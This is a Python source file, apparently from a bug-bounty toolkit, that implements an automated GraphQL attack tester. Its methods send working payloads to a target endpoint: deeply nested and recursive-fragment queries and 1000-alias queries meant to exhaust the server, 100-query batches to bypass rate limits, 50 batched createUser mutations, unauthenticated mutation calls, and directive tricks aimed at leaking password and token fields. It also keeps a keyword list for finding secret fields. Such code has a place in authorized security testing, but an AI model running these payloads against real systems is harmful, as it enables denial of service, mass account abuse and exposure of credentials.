"""
GraphQL Advanced Tester Agent

Advanced GraphQL security testing beyond basic enumeration. Tests for:
- DoS attacks (circular queries, field duplication, fragment recursion)
- Batch query abuse (rate limit bypass)
- Directive injection and abuse
- Subscription flooding
- Introspection bypass techniques
- Schema discovery via field suggestions

Average bounty: $5K-$25K per advanced GraphQL vulnerability
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import time
import json
import asyncio
import requests
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse



@dataclass
class GraphQLFinding:
    """Represents a GraphQL vulnerability finding."""
    title: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW, INFO
    vuln_type: str
    description: str
    poc: str
    impact: str
    endpoint: str
    evidence: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            'title': self.title,
            'severity': self.severity,
            'vuln_type': self.vuln_type,
            'description': self.description,
            'poc': self.poc,
            'impact': self.impact,
            'endpoint': self.endpoint,
            'evidence': self.evidence
        }


class GraphQLAdvancedTester:
    """
    Advanced GraphQL security testing.

    Tests beyond basic enumeration including:
    - DoS vulnerabilities
    - Batching abuse
    - Directive injection
    - Subscription flooding
    - Schema discovery
    """

    def __init__(self, url: str, timeout: int = 10, headers: Optional[Dict[str, str]] = None):
        """
        Initialize GraphQL Advanced Tester.

        Args:
            url: GraphQL endpoint URL
            timeout: Request timeout in seconds
            headers: Optional HTTP headers
        """
        self.url = url
        self.timeout = timeout
        self.headers = headers or {
            'Content-Type': 'application/json',
            'User-Agent': 'BountyHound/5.0'
        }
        self.schema: Dict[str, Any] = {}
        self.mutations: List[str] = []
        self.findings: List[GraphQLFinding] = []

    def test_graphql_endpoint(self, full_scan: bool = True) -> List[GraphQLFinding]:
        """
        Complete GraphQL security testing.

        Args:
            full_scan: If True, run all tests. If False, run quick tests only.

        Returns:
            List of GraphQL findings
        """
        print(f"🔐 GraphQL Advanced Testing: {self.url}")
        print("=" * 60)

        # Quick tests (always run)
        self.test_introspection_bypass()
        self.test_batch_query_abuse()

        if full_scan:
            # DoS tests
            self.test_circular_query_dos()
            self.test_field_duplication_dos()
            self.test_fragment_recursion()

            # Advanced tests
            self.test_directive_abuse()
            self.test_mutation_batching()

        self._print_summary()
        return self.findings

    def extract_schema(self, url: str) -> Dict[str, Any]:
        """
        Extract schema via introspection or field suggestions.

        Args:
            url: GraphQL endpoint URL

        Returns:
            Schema dictionary
        """
        # Try introspection first
        introspection_query = """
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                    name
                    kind
                    fields {
                        name
                        type { name kind ofType { name kind } }
                    }
                }
            }
        }
        """

        try:
            response = requests.post(
                url,
                json={'query': introspection_query},
                headers=self.headers,
                timeout=self.timeout
            )

            if response.status_code == 200:
                data = response.json()
                if 'data' in data and '__schema' in data['data']:
                    self.schema = data['data']['__schema']
                    return self.schema
        except Exception:
            pass

        # Fallback to field suggestions
        return self._extract_schema_via_suggestions(url)

    def _extract_schema_via_suggestions(self, url: str) -> Dict[str, Any]:
        """Extract schema using field suggestion technique."""
        schema = {'types': [], 'fields': []}

        # Send query with invalid field to trigger suggestions
        query = '{ invalidFieldNamezzz123 }'

        try:
            response = requests.post(
                url,
                json={'query': query},
                headers=self.headers,
                timeout=self.timeout
            )

            if response.status_code == 200:
                data = response.json()
                if 'errors' in data:
                    for error in data['errors']:
                        message = error.get('message', '')
                        if 'Did you mean' in message:
                            # Extract suggested fields
                            schema['fields'].extend(self._parse_suggestions(message))
        except Exception:
            pass

        return schema

    def _parse_suggestions(self, message: str) -> List[str]:
        """Parse field suggestions from error message."""
        suggestions = []
        # Extract fields from "Did you mean X, Y, Z?" format
        if 'Did you mean' in message:
            parts = message.split('Did you mean')
            if len(parts) > 1:
                field_text = parts[1].split('?')[0]
                suggestions = [f.strip(' "\'') for f in field_text.split(',')]
        return suggestions

    def test_mutations(self, url: str, mutations: List[str]) -> List[GraphQLFinding]:
        """
        Test mutations for missing authorization.

        Args:
            url: GraphQL endpoint
            mutations: List of mutation names

        Returns:
            List of findings
        """
        findings = []

        for mutation in mutations:
            # Test without auth token
            query = f'mutation {{ {mutation}(input: {{}}) {{ id }} }}'

            try:
                response = requests.post(
                    url,
                    json={'query': query},
                    headers=self.headers,
                    timeout=self.timeout
                )

                if response.status_code == 200:
                    data = response.json()

                    # Check if mutation succeeded without auth
                    if 'data' in data and data['data']:
                        finding = GraphQLFinding(
                            title=f"GraphQL Mutation Missing Authorization: {mutation}",
                            severity="HIGH",
                            vuln_type="BROKEN_ACCESS_CONTROL",
                            description=f"Mutation {mutation} can be executed without authentication",
                            poc=query,
                            impact="Unauthorized data modification",
                            endpoint=url,
                            evidence={'response': data}
                        )
                        findings.append(finding)
            except Exception:
                pass

        return findings

    def test_batching(self, url: str) -> List[GraphQLFinding]:
        """
        Test batch query attacks (alias-based rate limit bypass).

        Args:
            url: GraphQL endpoint

        Returns:
            List of findings
        """
        return self.test_batch_query_abuse()

    def test_depth_limit(self, url: str) -> List[GraphQLFinding]:
        """
        Test query depth limits.

        Args:
            url: GraphQL endpoint

        Returns:
            List of findings
        """
        return self.test_circular_query_dos()

    def find_sensitive_fields(self, schema: Dict[str, Any]) -> List[str]:
        """
        Find sensitive fields in schema.

        Args:
            schema: GraphQL schema

        Returns:
            List of sensitive field names
        """
        sensitive_keywords = [
            'password', 'secret', 'token', 'key', 'credential',
            'ssn', 'credit', 'card', 'private', 'internal',
            'admin', 'root', 'api_key', 'access_token'
        ]

        sensitive_fields = []

        if 'types' in schema:
            for type_def in schema['types']:
                if 'fields' in type_def:
                    for field in type_def['fields']:
                        field_name = field.get('name', '').lower()
                        if any(keyword in field_name for keyword in sensitive_keywords):
                            sensitive_fields.append(field['name'])

        return sensitive_fields

    # === DoS Attack Tests ===

    def test_circular_query_dos(self) -> bool:
        """
        Test circular query DoS (deeply nested queries).

        Returns:
            True if vulnerable, False otherwise
        """
        print("\n[DoS] Testing circular query attack...")

        depth = 50

        # Build deeply nested query: user -> posts -> author -> posts -> ...
        query = "query CircularDoS { user(id: 1) {"
        for _ in range(depth):
            query += " posts { author { "
        query += " id "
        for _ in range(depth):
            query += " } } "
        query += " } }"

        start_time = time.time()

        try:
            response = requests.post(
                self.url,
                json={'query': query},
                headers=self.headers,
                timeout=self.timeout
            )

            elapsed = time.time() - start_time

            if elapsed > 5 or response.status_code == 500:
                finding = GraphQLFinding(
                    title="GraphQL Circular Query DoS",
                    severity="HIGH",
                    vuln_type="DOS",
                    description=f"Deeply nested queries cause server performance degradation (depth={depth}, time={elapsed:.2f}s)",
                    poc=query,
                    impact="Server resource exhaustion, potential denial of service",
                    endpoint=self.url,
                    evidence={'response_time': elapsed, 'depth': depth}
                )
                self.findings.append(finding)
                print(f"   🚨 VULNERABLE - Response time: {elapsed:.2f}s")
                return True
            else:
                print(f"   ✅ Protected - Query handled in {elapsed:.2f}s")
                return False

        except requests.exceptions.Timeout:
            finding = GraphQLFinding(
                title="GraphQL Circular Query DoS (Timeout)",
                severity="HIGH",
                vuln_type="DOS",
                description=f"Deeply nested query caused timeout (depth={depth})",
                poc=query,
                impact="Server denial of service",
                endpoint=self.url,
                evidence={'depth': depth, 'timeout': self.timeout}
            )
            self.findings.append(finding)
            print(f"   🚨 TIMEOUT - DoS successful")
            return True

    def test_field_duplication_dos(self) -> bool:
        """
        Test field duplication DoS (alias abuse).

        Returns:
            True if vulnerable, False otherwise
        """
        print("\n[DoS] Testing field duplication attack...")

        # Generate query with 1000 aliases
        query = "query FieldDuplication { user(id: 1) { "
        for i in range(1000):
            query += f" alias{i}: email "
        query += " } }"

        start_time = time.time()

        try:
            response = requests.post(
                self.url,
                json={'query': query},
                headers=self.headers,
                timeout=self.timeout
            )

            elapsed = time.time() - start_time

            if elapsed > 5 or response.status_code == 500:
                finding = GraphQLFinding(
                    title="GraphQL Field Duplication DoS",
                    severity="MEDIUM",
                    vuln_type="DOS",
                    description=f"Massive field duplication causes performance degradation (1000 aliases, {elapsed:.2f}s)",
                    poc=query[:500] + "...",  # Truncate for readability
                    impact="Server performance degradation",
                    endpoint=self.url,
                    evidence={'response_time': elapsed, 'alias_count': 1000}
                )
                self.findings.append(finding)
                print(f"   🚨 VULNERABLE - Response time: {elapsed:.2f}s")
                return True
            else:
                print(f"   ✅ Protected - Query handled in {elapsed:.2f}s")
                return False

        except requests.exceptions.Timeout:
            finding = GraphQLFinding(
                title="GraphQL Field Duplication DoS (Timeout)",
                severity="MEDIUM",
                vuln_type="DOS",
                description="Field duplication caused timeout",
                poc=query[:500] + "...",
                impact="Server denial of service",
                endpoint=self.url,
                evidence={'alias_count': 1000, 'timeout': self.timeout}
            )
            self.findings.append(finding)
            print(f"   🚨 TIMEOUT - DoS successful")
            return True

    def test_fragment_recursion(self) -> bool:
        """
        Test fragment recursion DoS.

        Returns:
            True if vulnerable, False otherwise
        """
        print("\n[DoS] Testing fragment recursion...")

        query = '''
        query FragmentRecursion {
            user(id: 1) {
                ...UserFields
            }
        }

        fragment UserFields on User {
            id
            email
            posts {
                ...PostFields
            }
        }

        fragment PostFields on Post {
            id
            title
            author {
                ...UserFields
            }
        }
        '''

        start_time = time.time()

        try:
            response = requests.post(
                self.url,
                json={'query': query},
                headers=self.headers,
                timeout=self.timeout
            )

            elapsed = time.time() - start_time

            if elapsed > 5 or response.status_code == 500:
                finding = GraphQLFinding(
                    title="GraphQL Fragment Recursion DoS",
                    severity="HIGH",
                    vuln_type="DOS",
                    description=f"Recursive fragments cause performance issues ({elapsed:.2f}s)",
                    poc=query,
                    impact="Server resource exhaustion",
                    endpoint=self.url,
                    evidence={'response_time': elapsed}
                )
                self.findings.append(finding)
                print(f"   🚨 VULNERABLE - Response time: {elapsed:.2f}s")
                return True
            else:
                print(f"   ✅ Protected - Query handled in {elapsed:.2f}s")
                return False

        except requests.exceptions.Timeout:
            finding = GraphQLFinding(
                title="GraphQL Fragment Recursion DoS (Timeout)",
                severity="HIGH",
                vuln_type="DOS",
                description="Recursive fragments caused timeout",
                poc=query,
                impact="Server denial of service",
                endpoint=self.url,
                evidence={'timeout': self.timeout}
            )
            self.findings.append(finding)
            print(f"   🚨 TIMEOUT - DoS successful")
            return True

    # === Batch Query Abuse ===

    def test_batch_query_abuse(self) -> bool:
        """
        Test batch query abuse (rate limit bypass).

        Returns:
            True if vulnerable, False otherwise
        """
        print("\n[Batching] Testing batch query abuse...")

        # Generate batch of 100 queries
        batch = []
        for i in range(100):
            batch.append({
                'query': f'query {{ user(id: {i + 1}) {{ email name }} }}'
            })

        try:
            response = requests.post(
                self.url,
                json=batch,
                headers=self.headers,
                timeout=self.timeout
            )

            if response.status_code == 200:
                data = response.json()

                if isinstance(data, list) and len(data) >= 50:
                    finding = GraphQLFinding(
                        title="GraphQL Batch Query Abuse",
                        severity="HIGH",
                        vuln_type="RATE_LIMIT_BYPASS",
                        description=f"Batching allows {len(data)} queries in single request, bypassing rate limits",
                        poc=json.dumps(batch[:3]) + "... (100 total)",
                        impact="Rate limiting bypassed via batching, mass data extraction",
                        endpoint=self.url,
                        evidence={'batch_size': len(batch), 'processed': len(data)}
                    )
                    self.findings.append(finding)
                    print(f"   🚨 VULNERABLE - Processed {len(data)}/100 queries")
                    return True
                else:
                    print(f"   ✅ Protected - Batch limited to {len(data) if isinstance(data, list) else 0} queries")
                    return False
            else:
                print(f"   ✅ Protected - Batching rejected (status {response.status_code})")
                return False

        except Exception as e:
            print(f"   ✅ Protected - Batching failed: {str(e)}")
            return False

    def test_mutation_batching(self) -> bool:
        """
        Test mutation batching abuse.

        Returns:
            True if vulnerable, False otherwise
        """
        print("\n[Batching] Testing mutation batching...")

        # Try to create 50 users in one batch
        batch = []
        for i in range(50):
            batch.append({
                'query': f'''
                    mutation {{
                        createUser(input: {{
                            email: "test{i}@example.com",
                            password: "test123"
                        }}) {{
                            id
                            email
                        }}
                    }}
                '''
            })

        try:
            response = requests.post(
                self.url,
                json=batch,
                headers=self.headers,
                timeout=self.timeout
            )

            if response.status_code == 200:
                data = response.json()

                if isinstance(data, list):
                    successful = sum(1 for item in data if isinstance(item, dict) and 'data' in item and item['data'])

                    if successful > 10:
                        finding = GraphQLFinding(
                            title="GraphQL Mutation Batching Abuse",
                            severity="HIGH",
                            vuln_type="RATE_LIMIT_BYPASS",
                            description=f"Mutation batching allows mass resource creation ({successful}/{len(batch)} successful)",
                            poc=json.dumps(batch[:2]) + "... (50 total)",
                            impact="Mass resource creation, account creation abuse",
                            endpoint=self.url,
                            evidence={'batch_size': len(batch), 'successful': successful}
                        )
                        self.findings.append(finding)
                        print(f"   🚨 VULNERABLE - {successful}/50 mutations succeeded")
                        return True

            print(f"   ✅ Protected - Mutation batching limited")
            return False

        except Exception as e:
            print(f"   ✅ Protected - Mutation batching failed: {str(e)}")
            return False

    # === Directive Abuse ===

    def test_directive_abuse(self) -> bool:
        """
        Test directive abuse (@skip, @include, custom directives).

        Returns:
            True if vulnerable, False otherwise
        """
        print("\n[Directives] Testing directive abuse...")

        # Test @skip directive to access restricted fields
        query = '''
        query DirectiveAbuse($skip: Boolean!) {
            user(id: 1) {
                email @skip(if: $skip)
                password @skip(if: false)
                secretToken @skip(if: false)
            }
        }
        '''

        try:
            response = requests.post(
                self.url,
                json={'query': query, 'variables': {'skip': True}},
                headers=self.headers,
                timeout=self.timeout
            )

            if response.status_code == 200:
                data = response.json()

                # Check if sensitive fields leaked
                data_str = json.dumps(data)
                if any(keyword in data_str for keyword in ['password', 'secret', 'token']):
                    finding = GraphQLFinding(
                        title="GraphQL Directive Bypass",
                        severity="MEDIUM",
                        vuln_type="INFO_DISCLOSURE",
                        description="@skip directive exposes restricted fields",
                        poc=query,
                        impact="Information disclosure via directive manipulation",
                        endpoint=self.url,
                        evidence={'response': data}
                    )
                    self.findings.append(finding)
                    print(f"   🚨 VULNERABLE - Sensitive fields exposed")
                    return True

            print(f"   ✅ Protected - Directives properly enforced")
            return False

        except Exception as e:
            print(f"   ✅ Protected - Directive test failed: {str(e)}")
            return False

    # === Introspection Bypass ===

    def test_introspection_bypass(self) -> bool:
        """
        Test introspection bypass via field suggestions.

        Returns:
            True if field suggestions enabled, False otherwise
        """
        print("\n[Schema] Testing introspection bypass...")

        # Send query with invalid field to trigger suggestions
        query = '{ invalidFieldNamezzz123 }'

        try:
            response = requests.post(
                self.url,
                json={'query': query},
                headers=self.headers,
                timeout=self.timeout
            )

            if response.status_code == 200:
                data = response.json()

                if 'errors' in data:
                    for error in data['errors']:
                        message = error.get('message', '')

                        if 'Did you mean' in message or 'suggestion' in message.lower():
                            finding = GraphQLFinding(
                                title="GraphQL Schema Discovery via Field Suggestions",
                                severity="LOW",
                                vuln_type="INFO_DISCLOSURE",
                                description="Invalid fields trigger schema suggestions, bypassing disabled introspection",
                                poc=query,
                                impact="Information disclosure, schema enumeration",
                                endpoint=self.url,
                                evidence={'error_message': message}
                            )
                            self.findings.append(finding)
                            print(f"   🚨 VULNERABLE - Field suggestions enabled")
                            print(f"       Suggestion: {message}")
                            return True

            print(f"   ✅ Protected - Field suggestions disabled")
            return False

        except Exception as e:
            print(f"   ✅ Protected - Introspection test failed: {str(e)}")
            return False

    # === Utility Methods ===

    def _print_summary(self):
        """Print findings summary."""
        print("\n" + "=" * 60)
        print(f"RESULTS: {len(self.findings)} GraphQL vulnerabilities found\n")

        severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}

        for finding in self.findings:
            severity_counts[finding.severity] += 1
            print(f"[{finding.severity}] {finding.title}")
            print(f"   Impact: {finding.impact}")
            print()

        print("Summary by Severity:")
        for severity, count in severity_counts.items():
            if count > 0:
                print(f"   {severity}: {count}")
        print("=" * 60)

    def get_findings_summary(self) -> Dict[str, Any]:
        """
        Get summary of findings.

        Returns:
            Dictionary with findings summary
        """
        severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}

        for finding in self.findings:
            severity_counts[finding.severity] += 1

        return {
            'total_findings': len(self.findings),
            'severity_counts': severity_counts,
            'findings': [f.to_dict() for f in self.findings]
        }
